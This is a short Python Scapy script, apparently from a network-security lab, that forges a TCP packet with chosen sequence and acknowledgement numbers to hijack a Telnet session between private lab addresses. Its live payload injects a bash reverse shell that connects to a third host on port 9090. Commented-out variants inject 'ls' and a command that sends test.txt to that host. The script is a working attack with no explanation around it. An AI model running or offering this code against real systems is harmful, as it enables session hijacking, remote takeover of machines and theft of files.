from scapy.all import *

ip = IP(src="192.168.232.164",dst="192.168.232.169")

#tcp=TCP(sport= 40734, dport= 23 , flags="A" , seq=3659833772 , ack=3258101796)
#data="ls\r"

#tcp=TCP(sport= 54638, dport= 23 , flags="A" , seq= 1709265028 , ack=3948864398)
#data="\r cat test.txt > /dev/tcp/192.168.232.166/9090 \r"

tcp=TCP(sport= 48492, dport= 23 , flags="A" , seq= 4115964240 , ack=181174798)
data="\r /bin/bash -i> /dev/tcp/192.168.232.166/9090 2>&1 0<&1 \r"

pkt = ip/tcp/data
send(pkt,verbose=0)
print("send a packet\n")
